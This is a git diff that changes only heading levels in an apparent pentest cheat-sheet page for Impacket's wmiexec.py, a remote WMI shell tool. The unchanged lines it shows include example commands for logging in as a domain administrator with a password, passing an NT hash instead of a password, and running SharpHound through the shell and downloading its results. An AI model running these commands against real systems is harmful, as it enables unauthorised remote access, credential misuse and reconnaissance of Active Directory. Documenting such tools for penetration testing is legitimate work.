@@ -13,11 +13,11 @@ weight : 0
 
 Executes a semi-interactive shell using Windows Management Instrumentation.
 
-### Installation
+## Installation
 
 Install the [Impacket Framework]({{< ref "../" >}})
 
-### Usage
+## Usage
 
 ```plain
 wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-shell-type {cmd,powershell}] [-com-version MAJOR_VERSION:MINOR_VERSION] [-hashes LMHASH:NTHASH]
@@ -25,7 +25,7 @@ wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug] [-cod
                   target [command ...]
 ```
 
-### Flags
+## Flags
 
 ```plain
 Impacket v0.9.25.dev1+20220201.191645.d8679837 - Copyright 2021 SecureAuth Corporation
@@ -60,9 +60,9 @@ authentication:
   -keytab KEYTAB        Read keys for SPN from keytab file
 ```
 
-### Examples
+## Examples
 
-#### Enter as the user, not SYSTEM
+### Enter as the user, not SYSTEM
 
 ```plain
 $ wmiexec.py offsec.nl/administrator:Welkom1234@10.10.10.16
@@ -76,7 +76,7 @@ C:\>whoami
 offsec\administrator
 ```
 
-#### Enter with hash instead of password
+### Enter with hash instead of password
 
 ```plain
 wmiexec.py administrator@10.10.10.16 -hashes :0e0363213e37b94221497260b0bcb4fc Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation
@@ -87,7 +87,7 @@ wmiexec.py administrator@10.10.10.16 -hashes :0e0363213e37b94221497260b0bcb4fc I
 C:\>
 ```
 
-#### Use SharpHound in wmiexec.py
+### Use SharpHound in wmiexec.py
 
 ```plain
 $ wmiexec.py admin:Welkom1234@10.10.10.10
@@ -124,6 +124,6 @@ C:\>get 20201105105903_BloodHound.zip
 [*] Downloading C:\\20201105105903_BloodHound.zip
 ```
 
-### URL list
+## URL List
 
 * [Github.com](https://github.com/SecureAuthCorp/impacket)
